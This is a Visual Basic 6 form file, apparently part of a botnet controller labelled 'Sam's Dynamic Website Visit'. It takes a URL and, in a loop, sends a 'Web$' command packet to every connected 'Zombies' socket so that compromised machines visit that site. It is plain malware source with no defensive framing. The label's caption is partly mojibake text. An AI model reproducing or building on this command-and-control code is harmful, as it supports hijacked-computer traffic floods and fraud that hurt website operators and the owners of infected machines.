VERSION 5.00
Begin VB.Form Form2 
   BackColor       =   &H000000C0&
   BorderStyle     =   0  'None
   ClientHeight    =   945
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3840
   ControlBox      =   0   'False
   LinkTopic       =   "Form2"
   Moveable        =   0   'False
   ScaleHeight     =   945
   ScaleWidth      =   3840
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   255
      Left            =   3960
      TabIndex        =   3
      Top             =   240
      Width           =   255
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Go"
      Height          =   255
      Left            =   3240
      TabIndex        =   1
      Top             =   600
      Width           =   495
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   3015
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "„À«·: www.google.com (www ÌÃ» «‰ ÌÕ ÊÌ ⁄·Ï )"
      Height          =   255
      Left            =   240
      TabIndex        =   2
      Top             =   240
      Width           =   3615
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'/Sam's Dynamic Website Visit
Option Explicit
Dim f As Integer
Dim data(1 To 600) As String
Dim sent As Integer
Dim selecteditem As Integer
Private Declare Function GetCursorPos Lib "User32" (lpPoint As POINTAPI) As Long

Private Type POINTAPI
 X As Long
 Y As Long
End Type

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Load()
Dim NewPos As POINTAPI

Call GetCursorPos(NewPos)

 Me.Left = (NewPos.X * 15) + 100
 Me.Top = (NewPos.Y * 15) + 100

End Sub

Private Sub text1_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        Command1_Click
    End If
    If KeyAscii = 27 Then
    Unload Me
    End If
End Sub
Private Sub Command1_Click()
Dim pckt$
sent = 0
For f = 1 To Form1.ListView1.ListItems.Count
pckt$ = "Web" & "$" & Text1.text & "?"
Form1.Zombies(f).SendData pckt$
sent = sent + 1
Form1.ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"
Unload Me
DoEvents
Next f
End Sub
